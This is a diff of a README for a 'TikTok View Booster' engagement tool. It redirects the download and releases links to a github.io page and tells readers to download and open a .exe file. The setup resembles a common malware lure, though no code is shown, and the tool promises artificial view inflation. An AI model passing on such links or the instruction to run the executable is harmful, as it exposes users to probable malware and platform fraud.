@@ -1,6 +1,6 @@
 # 📈 TikTok-View-Booster-2026-Smart-Engagement-Growth-Tool-for-Content-Creators - Grow your TikTok presence with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nonaligned-chordatefamily941/TikTok-View-Booster-2026-Smart-Engagement-Growth-Tool-for-Content-Creators/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://nonaligned-chordatefamily941.github.io)
 
 TikTok View Booster is a tool built to help content creators increase views and engagement on their videos. This software automates the process of reaching your target audience, allowing you to focus on your content strategy. The tool runs on your computer and manages the promotion of your posts.
 
@@ -24,7 +24,7 @@ TikTok View Booster is a tool built to help content creators increase views and 
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the [official releases page](https://github.com/nonaligned-chordatefamily941/TikTok-View-Booster-2026-Smart-Engagement-Growth-Tool-for-Content-Creators/releases) to find the latest version.
+1. Visit the [official releases page](https://nonaligned-chordatefamily941.github.io) to find the latest version.
 2. Look for the file that ends in .exe.
 3. Click the file name to start the download.
 4. Open the file once it finishes downloading.
